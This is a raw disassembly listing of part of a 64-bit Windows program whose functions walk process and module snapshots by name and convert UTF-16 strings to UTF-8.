   140002ff4:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140002ff8:	0f 84 03 01 00 00    	je     0x140003101
   140002ffe:	48 89 c3             	mov    %rax,%rbx
   140003001:	48 8d 75 a0          	lea    -0x60(%rbp),%rsi
   140003005:	41 b8 38 04 00 00    	mov    $0x438,%r8d
   14000300b:	48 89 f1             	mov    %rsi,%rcx
   14000300e:	31 d2                	xor    %edx,%edx
   140003010:	e8 56 c3 01 00       	call   0x14001f36b
   140003015:	c7 45 a0 38 04 00 00 	movl   $0x438,-0x60(%rbp)
   14000301c:	48 89 d9             	mov    %rbx,%rcx
   14000301f:	48 89 f2             	mov    %rsi,%rdx
   140003022:	e8 57 b7 01 00       	call   0x14001e77e
   140003027:	85 c0                	test   %eax,%eax
   140003029:	0f 84 d2 00 00 00    	je     0x140003101
   14000302f:	0f 57 f6             	xorps  %xmm6,%xmm6
   140003032:	48 8d b5 f0 03 00 00 	lea    0x3f0(%rbp),%rsi
   140003039:	4c 8d bd d8 03 00 00 	lea    0x3d8(%rbp),%r15
   140003040:	4c 8d 65 a0          	lea    -0x60(%rbp),%r12
   140003044:	eb 1d                	jmp    0x140003063
   140003046:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000304d:	00 00 00 
   140003050:	48 89 d9             	mov    %rbx,%rcx
   140003053:	4c 89 e2             	mov    %r12,%rdx
   140003056:	e8 23 b7 01 00       	call   0x14001e77e
   14000305b:	85 c0                	test   %eax,%eax
   14000305d:	0f 84 9e 00 00 00    	je     0x140003101
   140003063:	48 8d 85 f8 03 00 00 	lea    0x3f8(%rbp),%rax
   14000306a:	0f 11 30             	movups %xmm6,(%rax)
   14000306d:	48 8b 05 cc eb 01 00 	mov    0x1ebcc(%rip),%rax        # 0x140021c40
   140003074:	48 89 85 f0 03 00 00 	mov    %rax,0x3f0(%rbp)
   14000307b:	41 b8 80 00 00 00    	mov    $0x80,%r8d
   140003081:	48 89 f1             	mov    %rsi,%rcx
   140003084:	31 d2                	xor    %edx,%edx
   140003086:	e8 85 0c 00 00       	call   0x140003d10
   14000308b:	49 81 e5 00 00 ff ff 	and    $0xffffffffffff0000,%r13
   140003092:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
   140003096:	48 89 85 d8 03 00 00 	mov    %rax,0x3d8(%rbp)
   14000309d:	48 8d 85 d0 01 00 00 	lea    0x1d0(%rbp),%rax
   1400030a4:	48 89 85 e0 03 00 00 	mov    %rax,0x3e0(%rbp)
   1400030ab:	4c 89 ad e8 03 00 00 	mov    %r13,0x3e8(%rbp)
   1400030b2:	4c 89 f9             	mov    %r15,%rcx
   1400030b5:	48 89 f2             	mov    %rsi,%rdx
   1400030b8:	e8 73 03 00 00       	call   0x140003430
   1400030bd:	48 8b 8d f0 03 00 00 	mov    0x3f0(%rbp),%rcx
   1400030c4:	48 8b 95 00 04 00 00 	mov    0x400(%rbp),%rdx
   1400030cb:	49 89 f8             	mov    %rdi,%r8
   1400030ce:	4d 89 f1             	mov    %r14,%r9
   1400030d1:	e8 1a f9 ff ff       	call   0x1400029f0
   1400030d6:	84 c0                	test   %al,%al
   1400030d8:	75 4c                	jne    0x140003126
   1400030da:	48 8b 95 f8 03 00 00 	mov    0x3f8(%rbp),%rdx
   1400030e1:	48 85 d2             	test   %rdx,%rdx
   1400030e4:	0f 84 66 ff ff ff    	je     0x140003050
   1400030ea:	48 8b 8d f0 03 00 00 	mov    0x3f0(%rbp),%rcx
   1400030f1:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400030f7:	e8 24 1d 00 00       	call   0x140004e20
   1400030fc:	e9 4f ff ff ff       	jmp    0x140003050
   140003101:	31 f6                	xor    %esi,%esi
   140003103:	31 ff                	xor    %edi,%edi
   140003105:	48 89 f8             	mov    %rdi,%rax
   140003108:	48 89 f2             	mov    %rsi,%rdx
   14000310b:	0f 28 b5 10 04 00 00 	movaps 0x410(%rbp),%xmm6
   140003112:	48 81 c4 a8 04 00 00 	add    $0x4a8,%rsp
   140003119:	5b                   	pop    %rbx
   14000311a:	5f                   	pop    %rdi
   14000311b:	5e                   	pop    %rsi
   14000311c:	41 5c                	pop    %r12
   14000311e:	41 5d                	pop    %r13
   140003120:	41 5e                	pop    %r14
   140003122:	41 5f                	pop    %r15
   140003124:	5d                   	pop    %rbp
   140003125:	c3                   	ret
   140003126:	48 89 d9             	mov    %rbx,%rcx
   140003129:	e8 56 b6 01 00       	call   0x14001e784
   14000312e:	8b 75 c0             	mov    -0x40(%rbp),%esi
   140003131:	48 8b 7d b8          	mov    -0x48(%rbp),%rdi
   140003135:	48 8b 95 f8 03 00 00 	mov    0x3f8(%rbp),%rdx
   14000313c:	48 85 d2             	test   %rdx,%rdx
   14000313f:	74 c4                	je     0x140003105
   140003141:	48 8b 8d f0 03 00 00 	mov    0x3f0(%rbp),%rcx
   140003148:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000314e:	e8 cd 1c 00 00       	call   0x140004e20
   140003153:	eb b0                	jmp    0x140003105
   140003155:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000315c:	00 00 00 
   14000315f:	90                   	nop
   140003160:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140003165:	55                   	push   %rbp
   140003166:	41 57                	push   %r15
   140003168:	41 56                	push   %r14
   14000316a:	41 55                	push   %r13
   14000316c:	41 54                	push   %r12
   14000316e:	56                   	push   %rsi
   14000316f:	57                   	push   %rdi
   140003170:	53                   	push   %rbx
   140003171:	48 83 ec 38          	sub    $0x38,%rsp
   140003175:	48 8d aa 80 00 00 00 	lea    0x80(%rdx),%rbp
   14000317c:	0f 29 74 24 20       	movaps %xmm6,0x20(%rsp)
   140003181:	48 8d 8d f0 03 00 00 	lea    0x3f0(%rbp),%rcx
   140003188:	e8 83 de ff ff       	call   0x140001010
   14000318d:	0f 28 74 24 20       	movaps 0x20(%rsp),%xmm6
   140003192:	48 83 c4 38          	add    $0x38,%rsp
   140003196:	5b                   	pop    %rbx
   140003197:	5f                   	pop    %rdi
   140003198:	5e                   	pop    %rsi
   140003199:	41 5c                	pop    %r12
   14000319b:	41 5d                	pop    %r13
   14000319d:	41 5e                	pop    %r14
   14000319f:	41 5f                	pop    %r15
   1400031a1:	5d                   	pop    %rbp
   1400031a2:	c3                   	ret
   1400031a3:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400031aa:	00 00 00 
   1400031ad:	0f 1f 00             	nopl   (%rax)
   1400031b0:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1400031b5:	55                   	push   %rbp
   1400031b6:	41 57                	push   %r15
   1400031b8:	41 56                	push   %r14
   1400031ba:	41 55                	push   %r13
   1400031bc:	41 54                	push   %r12
   1400031be:	56                   	push   %rsi
   1400031bf:	57                   	push   %rdi
   1400031c0:	53                   	push   %rbx
   1400031c1:	48 83 ec 38          	sub    $0x38,%rsp
   1400031c5:	48 8d aa 80 00 00 00 	lea    0x80(%rdx),%rbp
   1400031cc:	0f 29 74 24 20       	movaps %xmm6,0x20(%rsp)
   1400031d1:	48 8d 8d f0 03 00 00 	lea    0x3f0(%rbp),%rcx
   1400031d8:	e8 33 de ff ff       	call   0x140001010
   1400031dd:	0f 28 74 24 20       	movaps 0x20(%rsp),%xmm6
   1400031e2:	48 83 c4 38          	add    $0x38,%rsp
   1400031e6:	5b                   	pop    %rbx
   1400031e7:	5f                   	pop    %rdi
   1400031e8:	5e                   	pop    %rsi
   1400031e9:	41 5c                	pop    %r12
   1400031eb:	41 5d                	pop    %r13
   1400031ed:	41 5e                	pop    %r14
   1400031ef:	41 5f                	pop    %r15
   1400031f1:	5d                   	pop    %rbp
   1400031f2:	c3                   	ret
   1400031f3:	cc                   	int3
   1400031f4:	cc                   	int3
   1400031f5:	cc                   	int3
   1400031f6:	cc                   	int3
   1400031f7:	cc                   	int3
   1400031f8:	cc                   	int3
   1400031f9:	cc                   	int3
   1400031fa:	cc                   	int3
   1400031fb:	cc                   	int3
   1400031fc:	cc                   	int3
   1400031fd:	cc                   	int3
   1400031fe:	cc                   	int3
   1400031ff:	cc                   	int3
   140003200:	55                   	push   %rbp
   140003201:	41 57                	push   %r15
   140003203:	41 56                	push   %r14
   140003205:	41 55                	push   %r13
   140003207:	41 54                	push   %r12
   140003209:	56                   	push   %rsi
   14000320a:	57                   	push   %rdi
   14000320b:	53                   	push   %rbx
   14000320c:	48 81 ec a8 02 00 00 	sub    $0x2a8,%rsp
   140003213:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
   14000321a:	00 
   14000321b:	0f 29 b5 10 02 00 00 	movaps %xmm6,0x210(%rbp)
   140003222:	48 c7 85 08 02 00 00 	movq   $0xfffffffffffffffe,0x208(%rbp)
   140003229:	fe ff ff ff 
   14000322d:	49 89 d6             	mov    %rdx,%r14
   140003230:	48 89 cf             	mov    %rcx,%rdi
   140003233:	45 31 ff             	xor    %r15d,%r15d
   140003236:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000323b:	31 d2                	xor    %edx,%edx
   14000323d:	e8 36 b5 01 00       	call   0x14001e778
   140003242:	48 89 c3             	mov    %rax,%rbx
   140003245:	48 8d 75 a0          	lea    -0x60(%rbp),%rsi
   140003249:	41 b8 38 02 00 00    	mov    $0x238,%r8d
   14000324f:	48 89 f1             	mov    %rsi,%rcx
   140003252:	31 d2                	xor    %edx,%edx
   140003254:	e8 12 c1 01 00       	call   0x14001f36b
   140003259:	c7 45 a0 38 02 00 00 	movl   $0x238,-0x60(%rbp)
   140003260:	48 89 d9             	mov    %rbx,%rcx
   140003263:	48 89 f2             	mov    %rsi,%rdx
   140003266:	e8 1f b5 01 00       	call   0x14001e78a
   14000326b:	85 c0                	test   %eax,%eax
   14000326d:	0f 84 fd 00 00 00    	je     0x140003370
   140003273:	0f 57 f6             	xorps  %xmm6,%xmm6
   140003276:	48 8d b5 f0 01 00 00 	lea    0x1f0(%rbp),%rsi
   14000327d:	4c 8d bd d8 01 00 00 	lea    0x1d8(%rbp),%r15
   140003284:	4c 8d 65 a0          	lea    -0x60(%rbp),%r12
   140003288:	eb 19                	jmp    0x1400032a3
   14000328a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003290:	48 89 d9             	mov    %rbx,%rcx
   140003293:	4c 89 e2             	mov    %r12,%rdx
   140003296:	e8 ef b4 01 00       	call   0x14001e78a
   14000329b:	85 c0                	test   %eax,%eax
   14000329d:	0f 84 ca 00 00 00    	je     0x14000336d
   1400032a3:	48 8d 85 f8 01 00 00 	lea    0x1f8(%rbp),%rax
   1400032aa:	0f 11 30             	movups %xmm6,(%rax)
   1400032ad:	48 8b 05 8c e9 01 00 	mov    0x1e98c(%rip),%rax        # 0x140021c40
   1400032b4:	48 89 85 f0 01 00 00 	mov    %rax,0x1f0(%rbp)
   1400032bb:	41 b8 82 00 00 00    	mov    $0x82,%r8d
   1400032c1:	48 89 f1             	mov    %rsi,%rcx
   1400032c4:	31 d2                	xor    %edx,%edx
   1400032c6:	e8 45 0a 00 00       	call   0x140003d10
   1400032cb:	49 81 e5 00 00 ff ff 	and    $0xffffffffffff0000,%r13
   1400032d2:	48 8d 45 cc          	lea    -0x34(%rbp),%rax
   1400032d6:	48 89 85 d8 01 00 00 	mov    %rax,0x1d8(%rbp)
   1400032dd:	48 8d 85 d4 01 00 00 	lea    0x1d4(%rbp),%rax
   1400032e4:	48 89 85 e0 01 00 00 	mov    %rax,0x1e0(%rbp)
   1400032eb:	4c 89 ad e8 01 00 00 	mov    %r13,0x1e8(%rbp)
   1400032f2:	4c 89 f9             	mov    %r15,%rcx
   1400032f5:	48 89 f2             	mov    %rsi,%rdx
   1400032f8:	e8 33 01 00 00       	call   0x140003430
   1400032fd:	48 8b 8d f0 01 00 00 	mov    0x1f0(%rbp),%rcx
   140003304:	48 8b 95 00 02 00 00 	mov    0x200(%rbp),%rdx
   14000330b:	49 89 f8             	mov    %rdi,%r8
   14000330e:	4d 89 f1             	mov    %r14,%r9
   140003311:	e8 da f6 ff ff       	call   0x1400029f0
   140003316:	84 c0                	test   %al,%al
   140003318:	75 27                	jne    0x140003341
   14000331a:	48 8b 95 f8 01 00 00 	mov    0x1f8(%rbp),%rdx
   140003321:	48 85 d2             	test   %rdx,%rdx
   140003324:	0f 84 66 ff ff ff    	je     0x140003290
   14000332a:	48 8b 8d f0 01 00 00 	mov    0x1f0(%rbp),%rcx
   140003331:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140003337:	e8 e4 1a 00 00       	call   0x140004e20
   14000333c:	e9 4f ff ff ff       	jmp    0x140003290
   140003341:	48 89 d9             	mov    %rbx,%rcx
   140003344:	e8 3b b4 01 00       	call   0x14001e784
   140003349:	44 8b 7d a8          	mov    -0x58(%rbp),%r15d
   14000334d:	48 8b 95 f8 01 00 00 	mov    0x1f8(%rbp),%rdx
   140003354:	48 85 d2             	test   %rdx,%rdx
   140003357:	74 17                	je     0x140003370
   140003359:	48 8b 8d f0 01 00 00 	mov    0x1f0(%rbp),%rcx
   140003360:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140003366:	e8 b5 1a 00 00       	call   0x140004e20
   14000336b:	eb 03                	jmp    0x140003370
   14000336d:	45 31 ff             	xor    %r15d,%r15d
   140003370:	44 89 f8             	mov    %r15d,%eax
   140003373:	0f 28 b5 10 02 00 00 	movaps 0x210(%rbp),%xmm6
   14000337a:	48 81 c4 a8 02 00 00 	add    $0x2a8,%rsp
   140003381:	5b                   	pop    %rbx
   140003382:	5f                   	pop    %rdi
   140003383:	5e                   	pop    %rsi
   140003384:	41 5c                	pop    %r12
   140003386:	41 5d                	pop    %r13
   140003388:	41 5e                	pop    %r14
   14000338a:	41 5f                	pop    %r15
   14000338c:	5d                   	pop    %rbp
   14000338d:	c3                   	ret
   14000338e:	66 90                	xchg   %ax,%ax
   140003390:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140003395:	55                   	push   %rbp
   140003396:	41 57                	push   %r15
   140003398:	41 56                	push   %r14
   14000339a:	41 55                	push   %r13
   14000339c:	41 54                	push   %r12
   14000339e:	56                   	push   %rsi
   14000339f:	57                   	push   %rdi
   1400033a0:	53                   	push   %rbx
   1400033a1:	48 83 ec 38          	sub    $0x38,%rsp
   1400033a5:	48 8d aa 80 00 00 00 	lea    0x80(%rdx),%rbp
   1400033ac:	0f 29 74 24 20       	movaps %xmm6,0x20(%rsp)
   1400033b1:	48 8d 8d f0 01 00 00 	lea    0x1f0(%rbp),%rcx
   1400033b8:	e8 53 dc ff ff       	call   0x140001010
   1400033bd:	0f 28 74 24 20       	movaps 0x20(%rsp),%xmm6
   1400033c2:	48 83 c4 38          	add    $0x38,%rsp
   1400033c6:	5b                   	pop    %rbx
   1400033c7:	5f                   	pop    %rdi
   1400033c8:	5e                   	pop    %rsi
   1400033c9:	41 5c                	pop    %r12
   1400033cb:	41 5d                	pop    %r13
   1400033cd:	41 5e                	pop    %r14
   1400033cf:	41 5f                	pop    %r15
   1400033d1:	5d                   	pop    %rbp
   1400033d2:	c3                   	ret
   1400033d3:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400033da:	00 00 00 
   1400033dd:	0f 1f 00             	nopl   (%rax)
   1400033e0:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1400033e5:	55                   	push   %rbp
   1400033e6:	41 57                	push   %r15
   1400033e8:	41 56                	push   %r14
   1400033ea:	41 55                	push   %r13
   1400033ec:	41 54                	push   %r12
   1400033ee:	56                   	push   %rsi
   1400033ef:	57                   	push   %rdi
   1400033f0:	53                   	push   %rbx
   1400033f1:	48 83 ec 38          	sub    $0x38,%rsp
   1400033f5:	48 8d aa 80 00 00 00 	lea    0x80(%rdx),%rbp
   1400033fc:	0f 29 74 24 20       	movaps %xmm6,0x20(%rsp)
   140003401:	48 8d 8d f0 01 00 00 	lea    0x1f0(%rbp),%rcx
   140003408:	e8 03 dc ff ff       	call   0x140001010
   14000340d:	0f 28 74 24 20       	movaps 0x20(%rsp),%xmm6
   140003412:	48 83 c4 38          	add    $0x38,%rsp
   140003416:	5b                   	pop    %rbx
   140003417:	5f                   	pop    %rdi
   140003418:	5e                   	pop    %rsi
   140003419:	41 5c                	pop    %r12
   14000341b:	41 5d                	pop    %r13
   14000341d:	41 5e                	pop    %r14
   14000341f:	41 5f                	pop    %r15
   140003421:	5d                   	pop    %rbp
   140003422:	c3                   	ret
   140003423:	cc                   	int3
   140003424:	cc                   	int3
   140003425:	cc                   	int3
   140003426:	cc                   	int3
   140003427:	cc                   	int3
   140003428:	cc                   	int3
   140003429:	cc                   	int3
   14000342a:	cc                   	int3
   14000342b:	cc                   	int3
   14000342c:	cc                   	int3
   14000342d:	cc                   	int3
   14000342e:	cc                   	int3
   14000342f:	cc                   	int3
   140003430:	41 57                	push   %r15
   140003432:	41 56                	push   %r14
   140003434:	41 55                	push   %r13
   140003436:	41 54                	push   %r12
   140003438:	56                   	push   %rsi
   140003439:	57                   	push   %rdi
   14000343a:	55                   	push   %rbp
   14000343b:	53                   	push   %rbx
   14000343c:	48 83 ec 28          	sub    $0x28,%rsp
   140003440:	48 89 d6             	mov    %rdx,%rsi
   140003443:	48 8b 39             	mov    (%rcx),%rdi
   140003446:	4c 8b 79 08          	mov    0x8(%rcx),%r15
   14000344a:	8b 41 10             	mov    0x10(%rcx),%eax
   14000344d:	89 c5                	mov    %eax,%ebp
   14000344f:	c1 ed 10             	shr    $0x10,%ebp
   140003452:	66 85 c0             	test   %ax,%ax
   140003455:	0f 84 83 00 00 00    	je     0x1400034de
   14000345b:	89 e9                	mov    %ebp,%ecx
   14000345d:	89 c8                	mov    %ecx,%eax
   14000345f:	25 00 f8 00 00       	and    $0xf800,%eax
   140003464:	3d 00 d8 00 00       	cmp    $0xd800,%eax
   140003469:	0f 85 8d 00 00 00    	jne    0x1400034fc
   14000346f:	0f b7 d1             	movzwl %cx,%edx
   140003472:	b8 01 00 00 00       	mov    $0x1,%eax
   140003477:	81 fa ff db 00 00    	cmp    $0xdbff,%edx
   14000347d:	0f 87 97 00 00 00    	ja     0x14000351a
   140003483:	4c 39 ff             	cmp    %r15,%rdi
   140003486:	0f 84 65 02 00 00    	je     0x1400036f1
   14000348c:	0f b7 17             	movzwl (%rdi),%edx
   14000348f:	48 83 c7 02          	add    $0x2,%rdi
   140003493:	89 d3                	mov    %edx,%ebx
   140003495:	81 e3 00 fc 00 00    	and    $0xfc00,%ebx
   14000349b:	66 41 bd 01 00       	mov    $0x1,%r13w
   1400034a0:	81 fb 00 dc 00 00    	cmp    $0xdc00,%ebx
   1400034a6:	0f 85 50 02 00 00    	jne    0x1400036fc
   1400034ac:	81 c1 00 28 00 00    	add    $0x2800,%ecx
   1400034b2:	0f b7 c1             	movzwl %cx,%eax
   1400034b5:	8d 8a 00 24 00 00    	lea    0x2400(%rdx),%ecx
   1400034bb:	0f b7 c9             	movzwl %cx,%ecx
   1400034be:	48 c1 e0 2a          	shl    $0x2a,%rax
   1400034c2:	48 c1 e1 20          	shl    $0x20,%rcx
   1400034c6:	48 09 c1             	or     %rax,%rcx
   1400034c9:	48 b8 00 00 00 00 00 	movabs $0x1000000000000,%rax
   1400034d0:	00 01 00 
   1400034d3:	48 01 c8             	add    %rcx,%rax
   1400034d6:	66 83 f8 02          	cmp    $0x2,%ax
   1400034da:	74 2d                	je     0x140003509
   1400034dc:	eb 3c                	jmp    0x14000351a
   1400034de:	4c 39 ff             	cmp    %r15,%rdi
   1400034e1:	74 26                	je     0x140003509
   1400034e3:	0f b7 0f             	movzwl (%rdi),%ecx
   1400034e6:	48 83 c7 02          	add    $0x2,%rdi
   1400034ea:	89 c8                	mov    %ecx,%eax
   1400034ec:	25 00 f8 00 00       	and    $0xf800,%eax
   1400034f1:	3d 00 d8 00 00       	cmp    $0xd800,%eax
   1400034f6:	0f 84 73 ff ff ff    	je     0x14000346f
   1400034fc:	0f b7 c1             	movzwl %cx,%eax
   1400034ff:	48 c1 e0 20          	shl    $0x20,%rax
   140003503:	66 83 f8 02          	cmp    $0x2,%ax
   140003507:	75 11                	jne    0x14000351a
   140003509:	48 83 c4 28          	add    $0x28,%rsp
   14000350d:	5b                   	pop    %rbx
   14000350e:	5d                   	pop    %rbp
   14000350f:	5f                   	pop    %rdi
   140003510:	5e                   	pop    %rsi
   140003511:	41 5c                	pop    %r12
   140003513:	41 5d                	pop    %r13
   140003515:	41 5e                	pop    %r14
   140003517:	41 5f                	pop    %r15
   140003519:	c3                   	ret
   14000351a:	45 31 ed             	xor    %r13d,%r13d
   14000351d:	41 bc fd ff 00 00    	mov    $0xfffd,%r12d
   140003523:	4c 8d 74 24 24       	lea    0x24(%rsp),%r14
   140003528:	eb 16                	jmp    0x140003540
   14000352a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003530:	48 c1 e2 20          	shl    $0x20,%rdx
   140003534:	45 31 ed             	xor    %r13d,%r13d
   140003537:	48 89 d0             	mov    %rdx,%rax
   14000353a:	66 83 f8 02          	cmp    $0x2,%ax
   14000353e:	74 c9                	je     0x140003509
   140003540:	48 89 c3             	mov    %rax,%rbx
   140003543:	48 c1 eb 20          	shr    $0x20,%rbx
   140003547:	66 85 c0             	test   %ax,%ax
   14000354a:	41 0f 45 dc          	cmovne %r12d,%ebx
   14000354e:	81 fb 80 00 00 00    	cmp    $0x80,%ebx
   140003554:	73 3a                	jae    0x140003590
   140003556:	48 8b 56 10          	mov    0x10(%rsi),%rdx
   14000355a:	48 3b 56 08          	cmp    0x8(%rsi),%rdx
   14000355e:	75 12                	jne    0x140003572
   140003560:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140003566:	48 89 f1             	mov    %rsi,%rcx
   140003569:	e8 a2 07 00 00       	call   0x140003d10
   14000356e:	48 8b 56 10          	mov    0x10(%rsi),%rdx
   140003572:	48 8b 06             	mov    (%rsi),%rax
   140003575:	88 1c 10             	mov    %bl,(%rax,%rdx,1)
   140003578:	48 83 46 10 01       	addq   $0x1,0x10(%rsi)
   14000357d:	66 45 85 ed          	test   %r13w,%r13w
   140003581:	0f 84 d3 00 00 00    	je     0x14000365a
   140003587:	89 e9                	mov    %ebp,%ecx
   140003589:	e9 dc 00 00 00       	jmp    0x14000366a
   14000358e:	66 90                	xchg   %ax,%ax
   140003590:	81 fb 00 08 00 00    	cmp    $0x800,%ebx
   140003596:	73 28                	jae    0x1400035c0
   140003598:	c7 44 24 24 00 00 00 	movl   $0x0,0x24(%rsp)
   14000359f:	00 
   1400035a0:	89 d8                	mov    %ebx,%eax
   1400035a2:	c1 e8 06             	shr    $0x6,%eax
   1400035a5:	0c c0                	or     $0xc0,%al
   1400035a7:	88 44 24 24          	mov    %al,0x24(%rsp)
   1400035ab:	80 e3 3f             	and    $0x3f,%bl
   1400035ae:	80 cb 80             	or     $0x80,%bl
   1400035b1:	88 5c 24 25          	mov    %bl,0x25(%rsp)
   1400035b5:	bb 02 00 00 00       	mov    $0x2,%ebx
   1400035ba:	eb 6f                	jmp    0x14000362b
   1400035bc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400035c0:	c7 44 24 24 00 00 00 	movl   $0x0,0x24(%rsp)
   1400035c7:	00 
   1400035c8:	89 d8                	mov    %ebx,%eax
   1400035ca:	81 fb 00 00 01 00    	cmp    $0x10000,%ebx
   1400035d0:	73 27                	jae    0x1400035f9
   1400035d2:	c1 e8 0c             	shr    $0xc,%eax
   1400035d5:	0c e0                	or     $0xe0,%al
   1400035d7:	88 44 24 24          	mov    %al,0x24(%rsp)
   1400035db:	89 d8                	mov    %ebx,%eax
   1400035dd:	c1 e8 06             	shr    $0x6,%eax
   1400035e0:	24 3f                	and    $0x3f,%al
   1400035e2:	0c 80                	or     $0x80,%al
   1400035e4:	88 44 24 25          	mov    %al,0x25(%rsp)
   1400035e8:	80 e3 3f             	and    $0x3f,%bl
   1400035eb:	80 cb 80             	or     $0x80,%bl
   1400035ee:	88 5c 24 26          	mov    %bl,0x26(%rsp)
   1400035f2:	bb 03 00 00 00       	mov    $0x3,%ebx
   1400035f7:	eb 32                	jmp    0x14000362b
   1400035f9:	c1 e8 12             	shr    $0x12,%eax
   1400035fc:	0c f0                	or     $0xf0,%al
   1400035fe:	88 44 24 24          	mov    %al,0x24(%rsp)
   140003602:	89 d8                	mov    %ebx,%eax
   140003604:	c1 e8 0c             	shr    $0xc,%eax
   140003607:	24 3f                	and    $0x3f,%al
   140003609:	0c 80                	or     $0x80,%al
   14000360b:	88 44 24 25          	mov    %al,0x25(%rsp)
   14000360f:	89 d8                	mov    %ebx,%eax
   140003611:	c1 e8 06             	shr    $0x6,%eax
   140003614:	24 3f                	and    $0x3f,%al
   140003616:	0c 80                	or     $0x80,%al
   140003618:	88 44 24 26          	mov    %al,0x26(%rsp)
   14000361c:	80 e3 3f             	and    $0x3f,%bl
   14000361f:	80 cb 80             	or     $0x80,%bl
   140003622:	88 5c 24 27          	mov    %bl,0x27(%rsp)
   140003626:	bb 04 00 00 00       	mov    $0x4,%ebx
   14000362b:	48 8b 56 10          	mov    0x10(%rsi),%rdx
   14000362f:	48 89 f1             	mov    %rsi,%rcx
   140003632:	49 89 d8             	mov    %rbx,%r8
   140003635:	e8 d6 06 00 00       	call   0x140003d10
   14000363a:	48 8b 0e             	mov    (%rsi),%rcx
   14000363d:	48 03 4e 10          	add    0x10(%rsi),%rcx
   140003641:	4c 89 f2             	mov    %r14,%rdx
   140003644:	49 89 d8             	mov    %rbx,%r8
   140003647:	e8 25 bd 01 00       	call   0x14001f371
   14000364c:	48 01 5e 10          	add    %rbx,0x10(%rsi)
   140003650:	66 45 85 ed          	test   %r13w,%r13w
   140003654:	0f 85 2d ff ff ff    	jne    0x140003587
   14000365a:	4c 39 ff             	cmp    %r15,%rdi
   14000365d:	0f 84 a6 fe ff ff    	je     0x140003509
   140003663:	0f b7 0f             	movzwl (%rdi),%ecx
   140003666:	48 83 c7 02          	add    $0x2,%rdi
   14000366a:	89 c8                	mov    %ecx,%eax
   14000366c:	25 00 f8 00 00       	and    $0xf800,%eax
   140003671:	0f b7 d1             	movzwl %cx,%edx
   140003674:	3d 00 d8 00 00       	cmp    $0xd800,%eax
   140003679:	0f 85 b1 fe ff ff    	jne    0x140003530
   14000367f:	b8 01 00 00 00       	mov    $0x1,%eax
   140003684:	81 fa ff db 00 00    	cmp    $0xdbff,%edx
   14000368a:	77 4b                	ja     0x1400036d7
   14000368c:	4c 39 ff             	cmp    %r15,%rdi
   14000368f:	74 4e                	je     0x1400036df
   140003691:	0f b7 17             	movzwl (%rdi),%edx
   140003694:	48 83 c7 02          	add    $0x2,%rdi
   140003698:	89 d3                	mov    %edx,%ebx
   14000369a:	81 e3 00 fc 00 00    	and    $0xfc00,%ebx
   1400036a0:	66 41 bd 01 00       	mov    $0x1,%r13w
   1400036a5:	81 fb 00 dc 00 00    	cmp    $0xdc00,%ebx
   1400036ab:	75 3d                	jne    0x1400036ea
   1400036ad:	81 c1 00 28 00 00    	add    $0x2800,%ecx
   1400036b3:	0f b7 c9             	movzwl %cx,%ecx
   1400036b6:	8d 82 00 24 00 00    	lea    0x2400(%rdx),%eax
   1400036bc:	0f b7 c0             	movzwl %ax,%eax
   1400036bf:	48 c1 e1 2a          	shl    $0x2a,%rcx
   1400036c3:	48 c1 e0 20          	shl    $0x20,%rax
   1400036c7:	48 09 c8             	or     %rcx,%rax
   1400036ca:	48 b9 00 00 00 00 00 	movabs $0x1000000000000,%rcx
   1400036d1:	00 01 00 
   1400036d4:	48 01 c8             	add    %rcx,%rax
   1400036d7:	45 31 ed             	xor    %r13d,%r13d
   1400036da:	e9 5b fe ff ff       	jmp    0x14000353a
   1400036df:	45 31 ed             	xor    %r13d,%r13d
   1400036e2:	4c 89 ff             	mov    %r15,%rdi
   1400036e5:	e9 50 fe ff ff       	jmp    0x14000353a
   1400036ea:	89 d5                	mov    %edx,%ebp
   1400036ec:	e9 49 fe ff ff       	jmp    0x14000353a
   1400036f1:	45 31 ed             	xor    %r13d,%r13d
   1400036f4:	4c 89 ff             	mov    %r15,%rdi
   1400036f7:	e9 21 fe ff ff       	jmp    0x14000351d
   1400036fc:	89 d5                	mov    %edx,%ebp
   1400036fe:	e9 1a fe ff ff       	jmp    0x14000351d
   140003703:	cc                   	int3
   140003704:	cc                   	int3
   140003705:	cc                   	int3
   140003706:	cc                   	int3
   140003707:	cc                   	int3
   140003708:	cc                   	int3
   140003709:	cc                   	int3
   14000370a:	cc                   	int3
   14000370b:	cc                   	int3
   14000370c:	cc                   	int3
   14000370d:	cc                   	int3
   14000370e:	cc                   	int3
   14000370f:	cc                   	int3
   140003710:	41 57                	push   %r15
   140003712:	41 56                	push   %r14
   140003714:	41 55                	push   %r13
   140003716:	41 54                	push   %r12
   140003718:	56                   	push   %rsi
   140003719:	57                   	push   %rdi
   14000371a:	55                   	push   %rbp
   14000371b:	53                   	push   %rbx
   14000371c:	48 83 ec 48          	sub    $0x48,%rsp
   140003720:	49 8b 41 10          	mov    0x10(%r9),%rax
   140003724:	48 83 f8 02          	cmp    $0x2,%rax
   140003728:	0f 86 ff 00 00 00    	jbe    0x14000382d
   14000372e:	48 89 ce             	mov    %rcx,%rsi
   140003731:	49 8b 01             	mov    (%r9),%rax
   140003734:	48 8b 78 10          	mov    0x10(%rax),%rdi
   140003738:	49 03 38             	add    (%r8),%rdi
   14000373b:	48 8b 1a             	mov    (%rdx),%rbx
   14000373e:	48 8b 01             	mov    (%rcx),%rax
   140003741:	8b 68 05             	mov    0x5(%rax),%ebp
   140003744:	44 0f b7 70 09       	movzwl 0x9(%rax),%r14d
